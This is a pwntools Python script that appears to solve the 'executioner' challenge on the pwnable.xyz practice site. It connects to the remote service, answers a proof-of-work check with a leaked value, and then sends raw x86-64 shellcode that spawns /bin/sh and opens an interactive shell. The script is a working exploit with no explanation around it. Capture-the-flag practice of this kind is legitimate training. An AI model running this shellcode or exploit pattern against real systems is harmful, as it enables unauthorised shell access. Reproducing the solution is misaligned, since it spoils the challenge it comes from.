from pwn import *
#p = process("./executioner")
p = remote("svc.pwnable.xyz", 30025)
pause()
p.recvuntil("POW: x + y == ")
leak = int(p.recv(10), 16)
p.sendline("0")
p.sendline(str(leak))
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = p64(0x0) + shellcode
p.sendline(payload)
p.interactive()
